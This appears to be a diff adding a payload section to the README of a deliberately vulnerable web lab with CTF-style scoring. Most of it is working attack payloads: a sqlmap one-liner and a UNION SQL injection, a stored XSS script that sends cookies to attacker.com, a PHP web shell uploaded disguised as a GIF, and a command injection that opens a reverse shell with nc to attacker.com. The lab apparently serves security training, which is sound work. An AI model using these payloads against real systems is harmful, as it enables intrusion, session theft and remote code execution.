@@ -1,4 +1,5 @@
 
+SQL INJECTION (Union-Based)
 
 bash
 # sqlmap one-liner
@@ -7,3 +8,34 @@ sqlmap -u "http://localhost/vulnweblab/sqli/low.php?id=1" --dbs --batch
 # Manual payload
 GET /sqli/low.php?id=1'+UNION+SELECT+1,database(),user(),version()--+ HTTP/1.1
 
+XSS STORED (Admin Panel)
+
+xml
+<!-- /vulnerabilities/xss_s.php -->
+Name: <script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
+
+FILE UPLOAD → RCE
+
+bash
+# Upload shell.php
+POST /vulnerabilities/upload/ Content-Type: image/jpeg
+GIF89a<?php system($_GET['cmd']); ?>
+
+# Trigger: /vulnerabilities/upload/shell.php?cmd=whoami
+
+COMMAND INJECTION
+
+bash
+# /vulnerabilities/exec/
+ping -c 1 127.0.0.1; nc -e /bin/sh attacker.com 4444
+
+Full Payloads: payloads/ directory | Burp Extensions: Compatible
+📈 Scoring System
+
+text
+CRITICAL: 100pts (RCE, SQL Dump)
+HIGH:     75pts  (XSS Stored, LFI)
+MEDIUM:   50pts  (Blind SQLi, Reflected XSS)
+LOW:      25pts  (CSRF, Weak Auth)
+
+CTF Mode: ./ctf-mode.sh → 2hr timer + leaderboards
